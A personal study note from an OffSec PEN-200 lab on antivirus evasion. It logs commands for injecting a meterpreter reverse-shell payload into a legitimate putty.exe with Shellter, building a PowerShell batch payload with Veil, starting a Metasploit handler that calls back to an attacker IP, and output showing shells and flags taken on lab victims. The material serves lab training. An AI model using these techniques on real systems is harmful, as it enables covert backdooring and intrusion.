---
id: offsec labs
tags: [offsec, labs]
created: 2023-01-27
---
# offsec labs

backlinks: [[snippets-bash]]

sources:

---

## PEN-200: 17.3.5 Antivirus evasion


 Exercises

(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)

    Inject a meterpreter reverse shell payload in the WinRAR executable.
    Transfer the binary to your Windows client and ensure that it is not being detected by the antivirus.
    Run the WinRAR installer and migrate your meterpreter shell to prevent a disconnect.
    Attempt to find different executables and inject malicious code into them using Shellter.

(To be performed with the Topic Exercises VMs under “Resources” - Reporting is not required for these exercises)

5. In this exercise, you'll be facing off against COMODO antivirus engine running on VM #1. Use another popular 32-bit application, like Putty, to replicate the steps learned so far in order to inject malicious code in the binary with Shellter. The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, the victim user will double-click on any existing .exe Windows PE file(s) in the FTP root directory. If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, the script will execute and, hopefully, grant you a reverse shell. NOTE: set the FTP session as active and enable binary encoding while transferring the file.

```
#after install shellter need to update wine
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32

#if you receive the below error mov the ~/.wine dir and retry
#       wine: could not load kernel32.dll, status c0000135
mv ~/.wine ~/.wine.old


get  32-bit x86: putty.exe (signature) 
https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe

shellter
operation mode = A

/home/kali/Documents/git/bravo/offsec/pen200/17-AntivirusEvasion/portaputty.exe
enable stealth mode = Y

1 meterpreter_reverse_tcp

192.168.119.125
4444

Injection: verified


msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.119.125; set lport 4444; exploit"

run post/windows/manage/migrate

shell

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9C98-18D0

 Directory of c:\Users\Administrator\Desktop

03/01/2023  08:01 AM    <DIR>          .
03/01/2023  08:01 AM    <DIR>          ..
12/21/2021  12:43 PM         5,711,824 cav_installer_138430010_1a.exe
03/06/2023  10:46 PM                78 flag.txt
03/01/2023  08:01 AM             1,378 lab.ps1
12/06/2021  11:11 AM             2,348 Microsoft Edge.lnk
               4 File(s)      5,715,628 bytes
               2 Dir(s)   5,548,122,112 bytes free

c:\Users\Administrator\Desktop>type flag.txt
type flag.txt
OS{c03a53cb4ae057fe427bcb3fe89070e4}







```

1. Similar to the previous exercise, you'll be facing off against COMODO antivirus engine v12.2.2.8012 on VM #2. Although the PowerShell AV bypass we covered in this module is substantial, it has an inherent limitation. The malicious script cannot be "double-clicked" by the user for an immediate execution. Instead, it would open in notepad.exe or another default text editor. The tradecraft of manually weaponizing PowerShell scripts is beyond the scope of this module, but we can rely on another open-source framework to help us automate this process. Research how to install and use the Veil framework to help you with this challenge. The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, the victim user will double-click on any existing .bat Windows batch script file(s) in the FTP root directory. If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, the script will execute and, hopefully, grant you a reverse shell.

```
sudo apt install veil-evasion    
/usr/share/veil/config/setup.sh --force --silent


22 powershell






                                                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/veil]
└─$ msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.119.125; set lport 4444; exploit"
                                                  
# cowsay++
 ____________                                                                                                                                                                               
< metasploit >                                                                                                                                                                              
 ------------                                                                                                                                                                               
       \   ,__,                                                                                                                                                                             
        \  (oo)____                                                                                                                                                                         
           (__)    )\                                                                                                                                                                       
              ||--|| *                                                                                                                                                                      
                                                                                                                                                                                            

       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View all productivity tips with the 
tips command
Metasploit Documentation: https://docs.metasploit.com/

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
lhost => 192.168.119.125
lport => 4444
[*] Started reverse TCP handler on 192.168.119.125:4444 
[*] Sending stage (175686 bytes) to 192.168.125.53
[*] Meterpreter session 1 opened (192.168.119.125:4444 -> 192.168.125.53:59996) at 2023-03-07 15:35:05 +1000

meterpreter > shell
Process 6576 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>cd c:\Users\Administrator\Desktop       
cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop>type flag.txt
type flag.txt
OS{25ed67eb6efef35bf749a6f9364d2769}

c:\Users\Administrator\Desktop>






```
